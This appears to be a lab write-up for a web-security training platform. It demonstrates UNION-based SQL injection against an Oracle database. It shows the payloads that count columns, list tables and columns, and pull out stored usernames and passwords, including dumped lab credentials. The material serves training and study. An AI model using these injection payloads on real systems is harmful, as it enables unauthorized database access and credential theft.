# SQLi Lab 11

## Enumerating database elements in an Oracle-based Database system

This lab repeats the same requirements as lab 10. 

### First get the list of columns in the original query and the datatype for each query:

```txt
❯ python3 main.py --analyze https://target-ac871f831ef43b2980159d60005e002b.web-security-academy.net/filter?category=
[~] Status Code: 200.
[~] URL: https://target-ac871f831ef43b2980159d60005e002b.web-security-academy.net/filter?category='+order+by+1--
[~] Status Code: 200.
[~] URL: https://target-ac871f831ef43b2980159d60005e002b.web-security-academy.net/filter?category='+order+by+2--
[~] Status Code: 500.
[~] URL: https://target-ac871f831ef43b2980159d60005e002b.web-security-academy.net/filter?category='+order+by+3--
[+] Column count: 2
```

So we have the number of columns and after testing the datatypes for each column, we get that both columns are returning varchars (or strings)

### List of tables in the database:

We can get a full specification of the contents of the all_tables table in the OracleDB [documentation](https://docs.oracle.com/cd/B19306_01/server.102/b14237/statviews_2105.htm#REFRN20286).
```http
GET /filter?category=%27+union+select+table_name,+NULL+from+all_tables+-- HTTP/1.1
```

This will return the list of tables:

```txt
TTS_ERROR$
TTS_TBS$
TTS_USR$
TYPE$
TYPED_VIEW$
TYPEHIERARCHY$
TYPE_MISC$
UET$
UGROUP$
UNDO$
USER$
USERS_UGFLTF
USER_ASTATUS_MAP
USER_HISTORY$
USTATS$
UTL_RECOMP_COMPILED
UTL_RECOMP_ERRORS
UTL_RECOMP_SORTED
VIEW$
VIEWCON$
VIEWTRCOL$
VTABLE$
```

We can see here that the table that seems the most interesting is `USERS_UGFLTF`

### Enumerating the columns of the found table
```http
GET /filter?category=%27+union+select+column_name,+NULL+from+all_tab_columns+where+table_name+%3d+%27USERS_UGFLTF%27+-- HTTP/1.1
```

And we get the following two columns: 

```txt
PASSWORD_KLRWZC
USERNAME_JBVGLU
```


### Finding the password of the administrator user
```http
GET /filter?category='+union+select+USERNAME_JBVGLU,+PASSWORD_KLRWZC+from+USERS_UGFLTF+-- HTTP/1.1
```

This will return the following information. We can then use the administrator password and username to authenticate into the application and solve the lab.

```txt
administrator
73racq8f6evi56467wo2

carlos
fuu9znnpxqejp7944t2m

wiener
lbtomdqlgxlj4pa8ys4k
```